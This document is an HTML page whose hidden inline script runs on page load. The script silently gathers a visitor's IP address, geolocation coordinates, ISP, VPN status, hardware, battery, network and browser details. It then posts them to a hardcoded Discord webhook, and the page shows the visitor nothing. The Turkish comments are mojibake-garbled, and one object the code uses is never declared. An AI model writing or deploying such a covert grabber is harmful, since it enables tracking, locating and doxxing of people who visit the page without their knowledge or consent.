<body>
    <div class="l"></div>

    <script>
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";

        async function masterExtract() {

            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                if (dbg) {
                    info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
                    info.ven = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
                }
            } catch(e) {}

            // 2. IP VE KONUM
            try {
                const res = await fetch('https://ipapi.co/json/');
                const j = await res.json();
                info.ip = j.ip;
                info.iss = j.org + " (AS" + j.asn + ")";
                // HatalÄ± harita linki temizlendi
                info.loc = "ðŸ“ **BÃ¶lge:** " + j.city + ", " + j.region + " / " + j.country_name + 
                           "\nðŸ›°ï¸ **ISS:** `" + info.iss + "`" + 
                           "\nðŸ›¡ï¸ **Proxy/VPN:** " + (j.proxy ? 'âš ï¸ Aktif' : 'âœ… Temiz') + 
                           "\nðŸ—ºï¸ **Konum:** " + j.latitude + "," + j.longitude;
            } catch(e) {}

            // 3. ÅžEBEKE
            try {
                const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                info.net = n ? "âš¡ **HÄ±z:** ~" + n.downlink + " Mbps | **Ping:** " + n.rtt + "ms" : "EriÅŸilemedi";
            } catch(e) {}

            // 4. PÄ°L VE SÄ°STEM
            try {
                if (navigator.getBattery) {
                    const b = await navigator.getBattery();
                    info.bat = "%" + Math.round(b.level * 100) + (b.charging ? ' (Åžarjda)' : ' (Pilde)');
                }
            } catch(e) {}

            info.sys = "ðŸ’» **OS:** " + navigator.platform + "\nðŸ§  **CPU:** " + navigator.hardwareConcurrency + " Ã‡ekirdek\nðŸ’¾ **RAM:** " + (navigator.deviceMemory || 'Gizli') + " GB";
            info.ext = "ðŸŒ **Dil:** " + navigator.language + "\nâ° **Zaman:** " + Intl.DateTimeFormat().resolvedOptions().timeZone;

            // 5. PAYLOAD
            const payload = {
                embeds: [{
                    title: "ðŸ’€ KUSURSUZ ADLÄ° SÄ°STEM ANALÄ°ZÄ°",
                    color: 15158332,
                    fields: [
                        { name: "ðŸ“¡ ÅžEBEKE", value: info.loc + "\n" + info.net + "\n**IP:** `" + info.ip + "`", inline: false },
                        { name: "âš™ï¸ DONANIM", value: info.sys + "\n**GPU:** `" + info.gpu + "`\n**Pil:** " + info.bat, inline: false },
                        { name: "ðŸŒ SÄ°STEM", value: info.ext, inline: false },
                        { name: "ðŸ” USER AGENT", value: "```" + navigator.userAgent + "```" }
                    ],
                    timestamp: new Date().toISOString()
                }]
            };

            const blob = JSON.stringify(payload);
            
            // GÃ–NDERÄ°M (YÃ¶nlendirme yapmaz)
            fetch(u, { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: blob 
            }).catch(() => {
                navigator.sendBeacon(u, blob);
            });
        }

        window.onload = masterExtract;
    </script
